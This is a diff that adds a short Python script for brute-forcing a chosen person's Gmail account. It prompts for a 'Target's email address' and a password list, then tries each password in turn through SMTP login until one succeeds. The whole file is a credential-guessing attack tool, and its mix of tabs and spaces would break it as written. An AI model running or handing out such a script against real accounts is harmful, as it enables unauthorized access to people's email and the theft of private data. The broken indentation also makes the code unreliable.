@@ -1,0 +1,40 @@
+#!/usr/bin/python3
+
+import smtplib
+from termcolor import colored
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+flag=0
+
+user = input("[*] Enter Target's email address: ")
+passwdfile = input("[*] Enter the path to the password File: ")
+
+try:
+    with open(passwdfile, "r") as file:
+        for password in file:
+            password = password.strip('\n')
+            try:
+                smtpserver.login(user, password)
+                print(colored("[+] Password Found: %s" % password, 'green'))
+		flag=1		
+                break
+            except smtplib.SMTPAuthenticationError:
+                print(colored("[+] Wrong Password: " + password, 'red'))
+            except smtplib.SMTPException as e:
+                print(colored(f"[!] SMTP Error: {str(e)}", 'yellow'))
+            except Exception as e:
+                print(colored(f"[!] Unexpected Error: {str(e)}", 'yellow'))
+		if flag==1:
+			break
+
+except FileNotFoundError:
+    print(colored(f"[-] The file '{passwdfile}' was not found.", 'red'))
+except Exception as e:
+    print(colored(f"[!] An error occurred: {str(e)}", 'red'))
+
+
+
+
+
